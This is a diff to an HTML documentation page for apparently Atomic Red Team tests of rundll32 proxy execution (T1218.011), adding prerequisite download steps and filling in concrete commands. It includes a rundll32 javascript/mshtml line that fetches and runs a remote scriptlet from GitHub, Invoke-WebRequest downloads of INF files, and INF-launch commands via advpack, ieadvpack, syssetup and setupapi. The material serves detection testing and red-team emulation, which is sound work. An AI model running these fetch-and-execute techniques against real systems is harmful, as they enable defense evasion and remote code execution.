@@ -948,6 +948,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-inf-file-must-exist-on-disk-at-specified-location-inf-to-execute">
+         Description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id2">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -966,6 +994,34 @@
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id3">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id5">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id6">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id7">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -982,7 +1038,35 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id4">
+      <a class="reference internal nav-link" href="#id8">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id9">
+         Description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id10">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id11">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id12">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -999,7 +1083,35 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id5">
+      <a class="reference internal nav-link" href="#id13">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id14">
+         Description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id15">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id16">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id17">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -1048,7 +1160,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:#{file_url}&quot;).Exec();
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct&quot;).Exec();
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1068,7 +1180,7 @@ Upon execution calc.exe will be launched</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32 vbscript:&quot;\..\mshtml,RunHTMLApplication &quot;+String(CreateObject(&quot;WScript.Shell&quot;).Run(&quot;#{command_to_execute}&quot;),0)
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32 vbscript:&quot;\..\mshtml,RunHTMLApplication &quot;+String(CreateObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;),0)
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1086,9 +1198,35 @@ Upon execution calc.exe will be launched</p>
 Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
 Upon execution calc.exe will be launched</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-inf-file-must-exist-on-disk-at-specified-location-inf-to-execute">
+<h5>Description: Inf file must exist on disk at specified location (#{inf_to_execute})<a class="headerlink" href="#description-inf-file-must-exist-on-disk-at-specified-location-inf-to-execute" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1218.011\src\T1218.011.inf&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">011</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1107,8 +1245,34 @@ Upon execution calc.exe will be launched</p>
 <p>Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id3">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id4">
+<h5>Description: Inf file must exist on disk at specified location (#{inf_to_execute})<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id5">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id6">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1218.011\src\T1218.011.inf&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">011</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id7">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1125,9 +1289,35 @@ Upon execution calc.exe will be launched</p>
 <p>Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying “installation failed” will be opened</p>
 <p>Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id4">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}
+<div class="section" id="id8">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id9">
+<h5>Description: Inf file must exist on disk at specified location (#{inf_to_execute})<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id10">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011_DefaultInstall</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id11">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011_DefaultInstall</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">011</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">5</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id12">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1144,9 +1334,35 @@ Upon execution calc.exe will be launched</p>
 <p>Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying “installation failed” will be opened</p>
 <p>Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id5">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\#{inf_to_execute}
+<div class="section" id="id13">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id14">
+<h5>Description: Inf file must exist on disk at specified location (#{inf_to_execute})<a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id15">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011_DefaultInstall</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id16">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">011_DefaultInstall</span><span class="p">.</span><span class="n">inf</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">011</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id17">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
 </pre></div>
 </div>
 <div class="cell docutils container">
